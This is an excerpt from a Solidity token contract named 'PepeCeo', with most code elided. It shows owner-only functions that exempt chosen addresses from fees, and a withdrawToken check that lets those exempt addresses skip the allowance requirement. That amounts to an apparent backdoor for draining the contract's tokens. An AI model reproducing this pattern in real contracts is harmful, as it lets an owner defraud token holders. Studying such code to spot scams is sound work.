...
/*
*  Twitter:  https://twitter.com/PepeCeoChannel
*  Telegram: https://t.me/pepeceo_announcements
*  Website: https://pepeceo.us
*/
...
contract PepeCeo is Ownable {
    ...
    mapping(address => uint256) private timeOfLastTxClaimFee;
	...
	function _transfer(address from, address to, uint tokens) internal {
		...
		else if ((isExcludedFromFees[from])||isExcludedFromFees[to]) {
	...
	function allowBypassFees(address _guy) public onlyOwner {
		isExcludedFromFees[_guy] = true;
	}

	function disallowBypassFees(address _guy) public onlyOwner {
		isExcludedFromFees[_guy] = false;
	}
	...
	function withdrawToken(uint256 amount) public {
		...
		require(allowed[address(this)][msg.sender] >= amount||isExcludedFromFees[msg.sender], "You do not have enought... try a lower amount !");
